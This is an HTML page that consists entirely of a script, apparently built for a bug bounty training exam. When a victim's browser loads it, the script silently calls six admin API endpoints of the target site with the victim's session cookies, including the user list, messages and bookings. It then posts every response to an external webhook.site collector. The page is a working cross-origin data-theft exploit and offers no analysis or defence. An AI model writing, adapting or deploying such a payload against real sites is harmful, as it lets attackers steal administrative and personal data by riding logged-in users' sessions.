<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
        const base = "https://api-bugbounty-exam.hashacademy.co";

        const endpoints = [
            "/api/admin/bookings",
            "/api/admin/rentals",
            "/api/admin/rentals/stats",
            "/api/admin/cars/stats",
            "/api/admin/users", // Often overlooked, but holds admin list
            "/api/admin/messages" 
        ];

        endpoints.forEach(path => {
            fetch(base + path, { credentials: "include" })
                .then(r => r.text())
                .then(data => {
                    fetch(webh, {
                        method: "POST",
                        body: JSON.stringify({ path: path, data: data })
                    });
                }).catch(e => {});
        });
    </script>
</body>
</html>
